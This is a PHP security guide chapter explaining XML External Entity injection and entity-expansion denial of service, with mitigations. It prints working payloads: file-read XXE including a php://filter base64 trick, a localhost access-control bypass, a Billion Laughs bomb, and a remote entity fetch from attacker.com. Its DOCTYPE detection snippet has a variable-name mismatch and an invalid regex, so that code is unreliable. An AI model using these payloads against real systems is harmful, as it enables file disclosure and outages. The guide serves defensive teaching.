XML Injection
=============

Despite the advent of JSON as a lightweight means of communicating data between a server and client, XML remains a viable and popular alternative that is often supported in parallel to JSON by web service APIs. Outside of web services, XML is the foundation of exchanging a diversity of data using XML schemas such as RSS, Atom, SOAP and RDF, to name but a few of the more common standards.

XML is so ubiquitous that it can also be found in use on the web application server, in browsers as the format of choice for XMLHttpRequest requests and responses, and in browser extensions. Given its widespread use, XML can present an attractive target for XML Injection attacks due to its popularity and the default handling of XML allowed by common XML parsers such as libxml2 which is used by PHP in the ``DOM``, ``SimpleXML`` and ``XMLReader`` extensions. Where the browser is an active participant in an XML exchange, consideration should be given to XML as a request format where authenticated users, via a Cross-Site Scripting attack, may be submitting XML which is actually written by an attacker.

XML External Entity Injection
-----------------------------

Vulnerabilities to an XML External Entity Injection (XXE) exist because XML parsing libraries will often support the use of custom entity references in XML. You'll be familiar with XML's standard complement of entities used to represent special markup characters such as ``&gt;``, ``&lt;``, and ``&apos;``. XML allows you to expand on the standard entity set by defining custom entities within the XML document itself. Custom entities can be defined by including them directly in an optional ``DOCTYPE`` and the expanded value they represent may reference an external resource to be included. It is this capacity of ordinary XML to carry custom references which can be expanded with the contents of an external resources that gives rise to an XXE vulnerability. Under normal circumstances, untrusted inputs should never be capable of interacting with our system in unanticipated ways and XXE is almost certainly unexpected for most programmers making it an area of particular concern.

For example, let's define a new custom entity called "harmless":

.. code-block:: xml

    <!DOCTYPE results [ <!ENTITY harmless "completely harmless"> ]>

An XML document with this entity definition can now refer to the &harmless; entity anywhere where entities are allowed:

.. code-block:: xml

    <?xml version="1.0"?>
    <!DOCTYPE results [<!ENTITY harmless "completely harmless">]>
    <results>
        <result>This result is &harmless;</result>
    </results>

An XML parser such as PHP DOM, when interpreting this XML, will process this custom entity as soon as the document loads so that requesting the relevant text will return the following:

    This result is completely harmless

Custom entities obviously have a benefit in representing repetitive text and XML with shorter named entities. It's actually not that uncommon where the XML must follow a particular grammar and where custom entities make editing simpler. However, in keeping with our theme of not trusting outside inputs, we need to be very careful as to what all the XML our application is consuming is really up to. For example, this one is definitely not of the harmless variety:

.. code-block:: xml

    <?xml version="1.0"?>
    <!DOCTYPE results [<!ENTITY harmless SYSTEM "file:///var/www/config.ini">]>
    <results>
        <result>&harmless;</result>
    </results>

Depending on the contents of the requested local file, the content could be used when expanding the ``&harmless;`` entity and the expanded content could then be extracted from the XML parser and included in the web application's output for an attacker to examine, i.e. giving rise to Information Disclosure. The file retrieved will be interpreted as XML unless it avoids the special characters that trigger that interpretation thus making the scope of local file content disclosure limited. If the file is intepreted as XML but does not contain valid XML, an error will be the likely result preventing disclosure of the contents. PHP, however, has a neat "trick" available to bypass this scope limitation and remote HTTP requests can still, obviously, have an impact on the web application even if the returned response cannot be communicated back to the attacker.

PHP offers three frequently used methods of parsing and consuming XML: PHP ``DOM``, ``SimpleXML`` and ``XMLReader``. All three of these use the ``libxml2`` extension and external entity support is enabled by default. As a consequence, PHP has a by-default vulnerability to XXE which makes it extremely easy to miss when considering the security of a web application or an XML consuming library.

You should also remember that XHTML and HTML5 may both be serialised as valid XML which may mean that some XHTML pages or XML-serialised HTML5 could be parsed as XML, e.g. by using ``DOMDocument::loadXML()`` instead of ``DOMDocument::loadHTML()``. Such uses of an XML parser are also vulnerable to XML External Entity Injection. Remember that ``libxml2`` does not currently even recognise the HTML5 ``DOCTYPE`` and so cannot validate it as it would for XHTML DOCTYPES.

Examples of XML External Entity Injection
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

File Content And Information Disclosure
"""""""""""""""""""""""""""""""""""""""

We previously met an example of Information Disclosure by noting that a custom entity in XML could reference an external file.

.. code-block:: xml

    <?xml version="1.0"?>
    <!DOCTYPE results [<!ENTITY harmless SYSTEM "file:///var/www/config.ini">]>
    <results>
        <result>&harmless;</result>
    </results>

This would expand the custom ``&harmless;`` entity with the file contents. Since all such requests are done locally, it allows for disclosing the contents of all files that the application has read access to. This would allow attackers to examine files that are not publicly available should the expanded entity be included in the output of the application. The file contents that can be disclosed in this are significantly limited - they must be either XML themselves or a format which won't cause XML parsing to generate errors. This restriction can, however, be completely ignored in PHP:

.. code-block:: xml

    <?xml version="1.0"?>
    <!DOCTYPE results [
        <!ENTITY harmless SYSTEM
        "php://filter/read=convert.base64-encode/resource=/var/www/config.ini"
        >
    ]>
    <results>
        <result>&harmless;</result>
    </results>

PHP allows access to a PHP wrapper in URI form as one of the protocols accepted by common filesystem functions such as ``file_get_contents()``, ``require()``, ``require_once()``, ``file()``, ``copy()`` and many more. The PHP wrapper supports a number of filters which can be run against a given resource so that the results are returned from the function call. In the above case, we use the ``convert.base-64-encode`` filter on the target file we want to read.

What this means is that an attacker, via an XXE vulnerability, can read any accessible file in PHP regardless of its textual format. All the attacker needs to do is base64 decode the output they receive from the application and they can dissect the contents of a wide range of non-public files with impunity. While this is not itself directly causing harm to end users or the application's backend, it will allow attackers to learn quite a lot about the application they are attempting to map which may allow them to discover other vulnerabilities with a minimum of effort and risk of discovery.

Bypassing Access Controls
"""""""""""""""""""""""""

Access Controls can be dictated in any number of ways. Since XXE attacks are mounted on the backend to a web application, it will not be possible to use the current user's session to any effect but an attacker can still bypass backend access controls by virtue of making requests from the local server. Consider the following primitive access control:

.. code-block:: php

    if (isset($_SERVER['HTTP_CLIENT_IP'])
        || isset($_SERVER['HTTP_X_FORWARDED_FOR'])
        || !in_array(@$_SERVER['REMOTE_ADDR'], array(
            '127.0.0.1',
            '::1',
        ))
    ) {
        header('HTTP/1.0 403 Forbidden');
        exit(
            'You are not allowed to access this file.'
        );
    }

This snippet of PHP and countless others like it are used to restrict access to certain PHP files to the local server, i.e. localhost. However, an XXE vulnerability in the frontend to the application actually gives an attacker the exact credentials needed to bypass this access control since all HTTP requests by the XML parser will be made from localhost.

.. code-block:: xml

    <?xml version="1.0"?>
    <!DOCTYPE results [
        <!ENTITY harmless SYSTEM
        "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php"
        >
    ]>
    <results>
        <result>&harmless;</result>
    </results>

If log viewing were restricted to local requests, then the attacker may be able to successfully grab the logs anyway. The same thinking applies to maintenance or administration interfaces whose access is restricted in this fashion.

Denial Of Service (DOS)
"""""""""""""""""""""""

Almost anything that can dictate how server resources are utilised could feasibly be used to generate a DOS attack. With XML External Entity Injection, an attacker has access to make arbitrary HTTP requests which can be used to exhaust server resources under the right conditions.

See below also for other potential DOS uses of XXE attacks in terms of XML Entity Expansions.

Defenses against XML External Entity Injection
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Considering the very attractive benefits of this attack, it might be surprising that the defense is extremely simple. Since ``DOM``, ``SimpleXML``, and ``XMLReader`` all rely on ``libxml2``, we can simply use the ``libxml_disable_entity_loader()`` function to disable external entity resolution. This does not disable custom entities which are predefined in a ``DOCTYPE`` since these do not make use of external resources which require a file system operation or HTTP request.

.. code-block:: php

    $oldValue = libxml_disable_entity_loader(true);
    $dom = new DOMDocument();
    $dom->loadXML($xml);
    libxml_disable_entity_loader($oldValue);

You would need to do this for all operations which involve loading XML from a string, file or remote URI.

Where external entities are never required by the application or for the majority of its requests, you can simply disable external resource loading altogether on a more global basis which, in most cases, will be far more preferable to locating all instances of XML loading, bearing in mind many libraries are probably written with innate XXE vulnerabilities present:

.. code-block:: php
    
    libxml_disable_entity_loader(true);

Just remember to reset this once again to ``TRUE`` after any temporary enabling of external resource loading. An example of a process which requires external entities in an innocent fashion is rendering Docbook XML into HTML where the XSL styling is dependent on external entities.

This ``libxml2`` function is not, by an means, a silver bullet. Other extensions and PHP libraries which parse or otherwise handle XML will need to be assessed to locate their "off" switch for external entity resolution.

In the event that the above type of behaviour switching is not possible, you can alternatively check if an XML document declares a ``DOCTYPE``. If it does, and external entities are not allowed, you can then simply discard the XML document, denying the untrusted XML access to a potentially vulnerable parser, and log it as a probable attack. If you log attacks this will be a necessary step since there be no other errors or exceptions to catch the attempt. This check should be built into your normal Input Validation routines.

.. code-block:: php
    
    /**
     * Attempt a quickie detection
     */
    $collapsedXML = preg_replace("/[:space:]/", '', $xml);
    if(preg_match("/<!DOCTYPE/i", $collapsedXml)) {
        throw new \InvalidArgumentException(
            'Invalid XML: Detected use of illegal DOCTYPE'
        );
    }
    /**
     * Attempt a fallback detection using DOMDocument analysis
     */
    $dom = new DOMDocument;
    $dom->loadXML($xml);
    foreach ($dom->childNodes as $child) {
        if ($child->nodeType === XML_DOCUMENT_TYPE_NODE) {
            throw new \InvalidArgumentException(
                'Invalid XML: Detected use of illegal DOCTYPE'
            );
        }
    }

It is also worth considering that it's preferable to simply discard data that we suspect is the result of an attack rather than continuing to process it further. Why continue to engage with something that shows all the signs of being dangerous? Therefore, merging both steps from above has the benefit of proactively ignoring obviously bad data while still protecting you in the event that discarding data is beyond your control (e.g. 3rd-party libraries). Discarding the data entirely becomes far more compelling for another reason stated earlier - ``libxml_disable_entity_loader()`` does not disable custom entities entirely, only those which reference external resources. This can still enable a related Injection attack called XML Entity Expansion which we will meet next.

XML Entity Expansion
--------------------

XMl Entity Expansion is somewhat similar to XML Entity Expansion but it focuses primarily on enabling a Denial Of Service (DOS) attack by attempting to exhaust the resources of the target application's server environment. This is achieved in XML Entity Expansion by creating a custom entity definition in the XML's ``DOCTYPE`` which could, for example, generate a far larger XML structure in memory than the XML's original size would suggest thus allowing these attacks to consume memory resources essential to keeping the web server operating efficiently. This attack also applies to the XML-serialisation of HTML5 which is not currently recognised as HTML by the ``libxml2`` extension.

Examples of XML Entity Expansion 
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

There are several approaches to expanding XML custom entities to achieve the desired effect of exhausting server resources.

Generic Entity Expansion
""""""""""""""""""""""""

Also known as a "Quadratic Blowup Attack", a generic entity expansion attack, a custom entity is defined as an extremely long string. When the entity is used numerous times throughout the document, the entity is expanded each time leading to an XML structure which requires significantly more RAM than the original XML size would suggest.

.. code-block:: xml

    <?xml version="1.0"?>
    <!DOCTYPE results [<!ENTITY long "SOME_SUPER_LONG_STRING">]>
    <results>
        <result>Now include &long; lots of times to expand
        the in-memory size of this XML structure</result>
        <result>&long;&long;&long;&long;&long;&long;&long;
        &long;&long;&long;&long;&long;&long;&long;&long;
        &long;&long;&long;&long;&long;&long;&long;&long;
        &long;&long;&long;&long;&long;&long;&long;&long;
        Keep it going...
        &long;&long;&long;&long;&long;&long;&long;...</result>
    </results>

By balancing the size of the custom entity string and the number of uses of the entity within the body of the document, it's possible to create an XML
file or string which will be expanded to use up a predictable amount of server RAM. By occupying the server's RAM with repetitive requests of this nature, it would be possible to mount a successful Denial Of Service attack. The downside of the approach is that the initial XML must itself be quite large since the memory consumption is based on a simple multiplier effect.

Recursive Entity Expansion
""""""""""""""""""""""""""

Where generic entity expansion requires a large XML input, recursive entity expansion packs more punch per byte of input size. It relies on the XML parser to exponentially resolve sets of small entities in such a way that their exponential nature explodes from a much smaller XML input size into something substantially larger. It's quite fitting that this approach is also commonly called an "XML Bomb" or "Billion Laughs Attack".

.. code-block:: xml

    <?xml version="1.0"?>
    <!DOCTYPE results [
        <!ENTITY x0 "BOOM!">
        <!ENTITY x1 "&x0;&x0;">
        <!ENTITY x2 "&x1;&x1;">
        <!ENTITY x3 "&x2;&x2;">
        <!-- Add the remaining sequence from x4...x100 (or boom) -->
        <!ENTITY x99 "&x98;&x98;">
        <!ENTITY boom "&x99;&x99;">
    ]>
    <results>
        <result>Explode in 3...2...1...&boom;</result>
    </results>

The XML Bomb approach doesn't require a large XML size which might be restricted by the application. It's exponential resolving of the entities results in a final text expansion that is 2^100 times the size of the ``&x0;`` entity value. That's quite a large and devastating BOOM!

Remote Entity Expansion
"""""""""""""""""""""""

Both normal and recursive entity expansion attacks rely on locally defined entities in the XML's DTD but an attacker can also define the entities externally. This obviously requires that the XML parser is capable of making remote HTTP requests which, as we met earlier in describing XML External Entity Injection (XXE), should be disabled for your XML parser as a basic security measure. As a result, defending against XXEs defends against this form of XML Entity Expansion attack.
 
Nevertheless, the way remote entity expansion works is by leading the XML parser into making remote HTTP requests to fetch the expanded value of the referenced entities. The results will then themselves define other external entities that the XML parser must additionally make HTTP requests for. In this way, a couple of innocent looking requests can rapidly spiral out of control adding strain to the server's available resources with the final result perhaps itself encompassing a recursive entity expansion just to make matters worse.
 
.. code-block:: xml
 
    <?xml version="1.0"?>
    <!DOCTYPE results [
        <!ENTITY cascade SYSTEM "http://attacker.com/entity1.xml">
    ]>
    <results>
        <result>3..2..1...&cascade<result>
    </results>
 
The above also enables a more devious approach to executing a DOS attack should the remote requests be tailored to target the local application or any other application sharing its server resources. This can lead to a self-inflicted DOS attack where attempts to resolve external entities by the XML parser may trigger numerous requests to locally hosted applications thus consuming an even greater propostion of server resources. This method can therefore be used to amplify the impact of our earlier discussion about using XML External Entity Injection (XXE) attacks to perform a DOS attack.

Defenses Against XML Entity Expansion
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

The obvious defenses here are inherited from our defenses for ordinary XML External Entity (XXE) attacks. We should disable the resolution of custom entities in XML to local files and remote HTTP requests by using the following function which globally applies to all PHP XML extensions that internally use ``libxml2``.

.. code-block:: php

    libxml_disable_entity_loader(true);

PHP does, however, have the quirky reputation of not implementing an obvious means of completely disabling the definition of custom entities using an XML DTD via the ``DOCTYPE``. PHP does define a ``LIBXML_NOENT`` constant and there also exists public property ``DOMDocument::$substituteEntities`` but neither if used has any ameliorating effect. It appears we're stuck with using a makeshift set of workarounds instead.

Nevertheless, ``libxml2`` does has a built in default intolerance for recursive entity resolution which will light up your error log like a Christmas tree. As such, there's no particular need to implement a specific defense against recursive entities though we should do something anyway on the off chance ``libxml2`` suffers a relapse.

The primary new danger therefore is the inelegent approach of the Quadratic Blowup Attack or Generic Entity Expansion. This attack requires no remote or local system calls and does not require entity recursion. In fact, the only defense is to either discard XML or sanitise XML where it contains a ``DOCTYPE``. Discarding the XML is the safest bet unless use of a ``DOCTYPE`` is both expected and we received it from a secured trusted source, i.e. we received it over a peer-verified HTTPS connection. Otherwise we need to create some homebrewed logic in the absence of PHP giving us a working option to disable DTDs. We've met this safety check before...

.. code-block:: php

    /**
     * Attempt a quickie detection
     */
    $collapsedXML = preg_replace("/[:space:]/", '', $xml);
    if(preg_match("/<!DOCTYPE/i", $collapsedXml)) {
        throw new \InvalidArgumentException(
            'Invalid XML: Detected use of illegal DOCTYPE'
        );
    }
    /**
     * Attempt a fallback detection using DOMDocument analysis
     */
    $dom = new DOMDocument;
    $dom->loadXML($xml);
    foreach ($dom->childNodes as $child) {
        if ($child->nodeType === XML_DOCUMENT_TYPE_NODE) {
            throw new \InvalidArgumentException(
                'Invalid XML: Detected use of illegal DOCTYPE'
            );
        }
    }

The above is, of course, backed up by having ``libxml_disable_entity_loader`` set to ``TRUE`` so external entity references are not resolved. Where an XML parser is not reliant on ``libxml2`` this may be the only defense possible unless that parser has a comprehensive set of options controlling how entities can be resolved.


SOAP Injection
--------------

TBD